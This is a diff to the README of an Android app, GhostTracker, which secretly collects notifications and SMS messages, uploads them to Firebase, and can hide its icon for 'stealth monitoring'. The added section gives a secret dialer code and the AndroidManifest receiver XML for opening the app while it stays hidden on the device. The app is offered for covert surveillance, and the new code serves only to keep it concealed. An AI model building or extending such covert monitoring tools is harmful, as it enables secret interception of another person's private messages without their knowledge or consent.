@@ -1,3 +1,4 @@
+
 # GhostTracker App
 
 GhostTracker is an Android app that monitors notifications and SMS messages in the background and syncs data to Firebase in real-time. It supports hiding the app icon and invisible modes for stealth monitoring.
@@ -77,6 +78,30 @@ Make sure to grant the following permissions manually or at runtime:
 - Replace the Firebase project configuration (`google-services.json`) with your own.
 - Your app will automatically push notification data to your Firebase database under your project.
 - Monitor data changes directly on Firebase Console.
+
+---
+
+## Launching the App When Icon is Hidden
+
+If you have hidden the app icon for stealth mode, you can still open the app by using a secret code in your phone's dialer:
+
+1. Open your phone’s dialer.
+2. Dial the secret code: `*#*#1234#*#*`
+3. The app will launch automatically via the secret code receiver.
+
+This is made possible by the following receiver registered in the `AndroidManifest.xml`:
+
+```xml
+<receiver android:name=".receivers.SecretCodeReceiver"
+          android:exported="true">
+    <intent-filter>
+        <action android:name="android.provider.Telephony.SECRET_CODE" />
+        <data android:scheme="android_secret_code" android:host="1234" />
+    </intent-filter>
+</receiver>
+```
+
+You can customize the secret code by changing the `android:host` value.
 
 ---
 
